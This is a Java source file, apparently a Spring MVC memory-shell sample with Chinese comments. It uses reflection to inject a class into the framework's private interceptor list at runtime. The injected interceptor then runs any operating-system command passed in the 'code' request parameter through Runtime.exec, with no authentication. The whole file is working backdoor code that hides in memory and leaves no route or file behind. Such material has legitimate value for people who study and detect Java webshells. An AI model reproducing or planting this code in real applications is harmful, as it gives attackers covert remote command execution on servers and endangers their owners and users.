//package bitterz.interceptors;

import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class TestInterceptor extends HandlerInterceptorAdapter {
    public TestInterceptor() throws NoSuchFieldException, IllegalAccessException, InstantiationException {
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");
        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field.setAccessible(true);
        java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);
        // 避免重复添加
        for (int i = adaptedInterceptors.size() - 1; i > 0; i--) {
            if (adaptedInterceptors.get(i) instanceof TestInterceptor) {
                System.out.println("已经添加过TestInterceptor实例了");
                return;
            }
        }

        TestInterceptor aaa = new TestInterceptor("aaa");  // 避免进入实例创建的死循环
        adaptedInterceptors.add(aaa);  //  添加全局interceptor
    }

    private TestInterceptor(String aaa){}

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String code = request.getParameter("code");
        if (code != null) {
            java.lang.Runtime.getRuntime().exec(code);
            return true;
        }
        else {
//            response.sendError(404);
            return true;
        }}}
